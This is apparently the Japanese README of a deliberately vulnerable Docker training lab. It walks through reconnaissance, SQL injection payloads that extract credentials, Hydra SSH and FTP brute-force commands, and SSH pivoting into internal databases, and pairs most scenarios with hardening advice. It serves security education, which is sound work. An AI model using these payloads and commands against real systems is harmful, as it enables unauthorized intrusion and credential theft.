# サイバーセキュリティ検証ラボ

> **参考**: Black Hat Bash (O'Reilly Japan) 第3章「検証環境のセットアップ」

> **警告**: このラボは**教育目的専用**です。意図的に脆弱な構成を含みます。
> インターネットに公開しないでください。

---

## ネットワーク構成

```
攻撃者 (Kali)
172.16.10.200
      |
      | 公開ネットワーク (172.16.10.0/24)
      |
  ┌───┴──────────────────────────────────┐
  │                                      │
p-web-01      p-web-02    p-ftp-01   p-jumpbox-01
172.16.10.10  172.16.10.11 172.16.10.21 172.16.10.100
                                              |
                                              | 社内ネットワーク (10.1.0.0/24)
                                              |
                              ┌───────────────┴────────────┐
                              │               │            │
                          c-rails-01      c-db-01      c-db-02
                          10.1.0.10       10.1.0.20    10.1.0.21
                                                           |
                                                      c-backup-01
                                                      10.1.0.30
```

### マシン一覧

| ホスト名 | IPアドレス | 役割 | 学習できる脆弱性 |
|----------|-----------|------|----------------|
| p-web-01 | 172.16.10.10 | 公開WebサーバーDVWA | SQLi, XSS, コマンドインジェクション |
| p-web-02 | 172.16.10.11 | 公開Webサーバー | ディレクトリリスティング, 機密ファイル露出 |
| p-ftp-01 | 172.16.10.21 | FTPサーバー | 匿名ログイン, 平文通信 |
| p-jumpbox-01 | 172.16.10.100 | 踏み台サーバー | 弱いSSH認証, ピボット攻撃 |
| c-rails-01 | 10.1.0.10 | 内部Railsアプリ | - |
| c-db-01 | 10.1.0.20 | PostgreSQL DB | 過剰な権限, 弱いパスワード |
| c-db-02 | 10.1.0.21 | MySQL DB | MD5ハッシュ, デフォルト設定 |
| c-backup-01 | 10.1.0.30 | バックアップサーバー | 認証なしSamba共有, 機密情報 |
| kali | 172.16.10.200 | 攻撃者マシン | - |

---

## セットアップ

### 前提条件

- Docker Engine 20.10+
- Docker Compose v2.0+
- メモリ: 8GB以上推奨
- ストレージ: 20GB以上の空き容量

### 起動手順

```bash
# リポジトリのクローン
cd lab/

# 全サービス起動 (初回はビルドに時間がかかります)
docker compose up -d --build

# 起動確認
docker compose ps

# Kaliコンテナにアクセス
docker exec -it kali bash
```

### 停止

```bash
docker compose down
```

---

## 学習シナリオ

### シナリオ1: Webアプリケーション攻撃 (初級)

**目標**: p-web-01 の脆弱なWebアプリに対してSQLインジェクションを試みる

```bash
# Kaliコンテナに入る
docker exec -it kali bash

# 偵察スクリプトを実行
bash /opt/lab-scripts/01_reconnaissance.sh

# 列挙スクリプトを実行
bash /opt/lab-scripts/02_enumeration.sh
```

**手動でのSQLインジェクション体験:**
1. ブラウザで `http://localhost:8080/app/` にアクセス
2. 検索フォームに `' OR '1'='1` を入力
3. 全ユーザーが表示される → SQLインジェクション成功
4. `' UNION SELECT 1,2,3,username,password,6 FROM users--` で認証情報を取得

**DVWA での学習:**
1. `http://localhost:8080/dvwa/` にアクセス
2. ログイン: admin / password
3. SQL Injection、XSS、Command Injection 等のモジュールを試す

---

### シナリオ2: ディレクトリ探索とファイル露出 (初級)

**目標**: p-web-02 のディレクトリリスティングから機密情報を入手する

```bash
# Kaliコンテナから
curl http://172.16.10.11/
curl http://172.16.10.11/backup/
curl http://172.16.10.11/config/database.yml
```

**学習ポイント:**
- ディレクトリリスティングを禁止する (`autoindex off`)
- 機密ファイルをWebルートに置かない
- `.htaccess` や Nginx 設定で不要なファイルへのアクセスを制限する

---

### シナリオ3: SSH ブルートフォース (中級)

**目標**: p-jumpbox-01 にブルートフォースでSSHアクセスを取得する

```bash
# Hydra でブルートフォース
hydra -L /opt/lab-scripts/wordlists/users.txt \
      -P /opt/lab-scripts/wordlists/passwords.txt \
      -t 4 ssh://172.16.10.100 -s 2222

# 取得した認証情報でSSH接続
ssh admin@172.16.10.100 -p 2222
# パスワード: admin123
```

**防御方法:**
- `fail2ban` でブルートフォースを検知・遮断
- SSH鍵認証のみ許可し、パスワード認証を無効化
- `AllowUsers` でSSH接続ユーザーを制限

---

### シナリオ4: ピボット攻撃 (中〜上級)

**目標**: ジャンプボックスを踏み台にして社内ネットワークの DB サーバーにアクセスする

```bash
# ステップ1: ジャンプボックスにSSH接続 + SOCKSプロキシ設定
ssh -D 1080 -N -f admin@172.16.10.100 -p 2222
# パスワード: admin123

# ステップ2: proxychains 経由で内部DBをスキャン
proxychains nmap -sT -Pn 10.1.0.20

# ステップ3: 内部DBに接続
ssh -L 5432:10.1.0.20:5432 admin@172.16.10.100 -p 2222
psql -h localhost -U rails -d rails_app
# パスワード: password
```

**防御方法:**
- ジャンプボックスで `AllowTcpForwarding no` を設定
- ネットワークセグメンテーションの強化
- 最小権限の原則: ジャンプボックスから内部DBへの直接アクセスを制限

---

### シナリオ5: FTPサーバー侵害 (初〜中級)

**目標**: FTPサーバーへの匿名アクセスとファイル取得

```bash
# 匿名FTPアクセス
ftp 172.16.10.21
# anonymous / (空白) でログイン

# ファイル一覧
ls -la

# ブルートフォース (Hydra)
hydra -L /opt/lab-scripts/wordlists/users.txt \
      -P /opt/lab-scripts/wordlists/passwords.txt \
      ftp://172.16.10.21
```

---

## 防御の学習

各攻撃シナリオに対応する**防御策**を実際に設定して学ぶことができます。

### 防御設定ガイド

```bash
# configs/ ディレクトリに防御設定のサンプルがあります
ls /home/user/saiteki-doc/lab/configs/
```

| ファイル | 内容 |
|---------|------|
| `hardened-nginx.conf` | セキュリティヘッダー付きNginx設定 |
| `hardened-sshd_config` | セキュアなSSH設定 |
| `hardened-vsftpd.conf` | 匿名アクセス無効FTP設定 |

---

## 学習の進め方

```
1. 偵察       → 01_reconnaissance.sh
2. 列挙       → 02_enumeration.sh
3. 脆弱性悪用 → 03_exploitation.sh
4. ピボット   → 04_pivoting.sh
5. 防御設定   → configs/ ディレクトリを参照
6. 再度攻撃   → 防御後に同じ攻撃が通じないことを確認
```

**攻撃 → 防御 → 再攻撃** のサイクルで理解を深めてください。

---

## 参考リソース

- [DVWA (Damn Vulnerable Web Application)](https://github.com/digininja/DVWA)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [HackTheBox](https://www.hackthebox.com/) - 実践的なCTF環境
